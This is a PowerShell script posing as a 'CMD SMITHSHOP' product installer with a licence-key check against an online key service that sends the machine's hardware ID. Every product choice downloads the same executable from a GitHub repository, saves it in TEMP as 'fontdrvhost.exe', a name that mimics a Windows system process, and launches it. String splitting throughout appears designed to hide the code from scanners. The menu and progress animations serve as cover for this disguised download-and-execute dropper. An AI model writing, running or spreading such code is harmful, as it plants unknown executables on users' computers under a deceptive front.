[Console]::OutputEncoding=[Text.Encoding]::UTF8;cls

function x($k){

    $a=("Smith"+"shop all")
    $b=("gw1r"+"zpahob")
    $c=("1."+"0")

    try{

        $z=Invoke-RestMethod -Uri ("https://key"+"auth.win/api/1.2/") -Method Post -Body @{
            type=("in"+"it");name=$a;ownerid=$b;version=$c
        }

        if(!$z.success){return "e"}

        $s=$z.sessionid
        $h=(Get-ItemProperty ("HKLM:\SOFT"+"WARE\Micro"+"soft\Crypto"+"graphy")).MachineGuid

        $y=Invoke-RestMethod -Uri ("https://key"+"auth.win/api/1.2/") -Method Post -Body @{
            type=("lic"+"ense");key=$k;name=$a;ownerid=$b;sessionid=$s;hwid=$h
        }

        if($y.success){"ok"}
        else{
            if((($y.message)+"") -match ("hw"+"id")){"u"}
            else{"f"}
        }

    }catch{"e"}
}

function chk($t){

    $c=@("Red","Yellow","Green","Cyan","Blue","Magenta")
    $e=(Get-Date).AddSeconds(2)
    $i=0

    while((Get-Date)-lt$e){

        $d=("."*($i%6))
        $cl=$c[($i%$c.Count)]

        Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl

        [console]::beep(300,50)

        Start-Sleep -Milliseconds (60+($i*2))
        $i++
    }

    ""
}

function ld($t){

    $c=@("Red","Yellow","Green","Cyan","Blue","Magenta")

    for($i=0;$i -lt 60;$i++){

        $d=("."*($i%6))
        $cl=$c[($i%$c.Count)]

        Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl

        [console]::beep(900,60)

        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 90)
    }

    ""
}

$u=("https://github.com/"+"draft7973-ops/"+("Smith"+"shop")+"/raw/main/"+("font"+"drvhost.exe"))
$p=($env:TEMP+"\"+("font"+"drvhost.exe"))

Write-Host ("=== CMD "+"SMITHSHOP ===") -ForegroundColor Cyan
Write-Host ("1. "+"Install")
Write-Host ("2. "+"Clean")

$ch=Read-Host (">")

if(($ch+"") -eq "1"){

    $k=Read-Host ("Enter "+"Key")

    cls
    Write-Host ("=== CMD SMITHSHOP ===`n") -ForegroundColor Cyan

    chk ("checking "+"key ")

    $r = x $k

    if($r -eq "ok"){

        [console]::beep(1200,400)
        Write-Host ("`nKEY "+"SUCCESS") -ForegroundColor Green
        Start-Sleep 1

        while($true){

            cls
            Write-Host ("=== CMD SMITHSHOP ===`n") -ForegroundColor Cyan
            Write-Host ("1. "+"smith"+"x3d")
            Write-Host ("2. "+"upto"+"king")
            Write-Host ("3. "+"king"+"smith")
            Write-Host ("0. "+"exit")

            $m=Read-Host (">")

            switch($m){
                "1"{$n=("smith"+"x3d")}
                "2"{$n=("upto"+"king")}
                "3"{$n=("king"+"smith")}
                "0"{break}
                default{continue}
            }

            cls
            Write-Host ("=== CMD SMITHSHOP ===`n") -ForegroundColor Cyan

            ld (("install "+$n+" "))

            Invoke-WebRequest $u -OutFile $p
            Start-Process $p

            Write-Host ("`nDONE") -ForegroundColor Green
            Start-Sleep 2
        }

    }elseif($r -eq "u"){

        [console]::beep(500,400)
        Write-Host ("`nHWID "+"ALREADY USED") -ForegroundColor Yellow
        Pause
        exit

    }else{

        [console]::beep(300,300)
        Write-Host ("`nKEY "+"INVALID") -ForegroundColor Red
        Pause
        exit
    }

}
elseif(($ch+"") -eq "2"){

    cls
    Write-Host ("=== CMD SMITHSHOP ===`n") -ForegroundColor Cyan

    ld ("clean"+"ing ")

    if(Test-Path $p){
        Remove-Item $p -Force
        Write-Host ("`nDONE") -ForegroundColor Green
    }else{
        Write-Host ("`nNOT FOUND") -ForegroundColor Red
    }
}
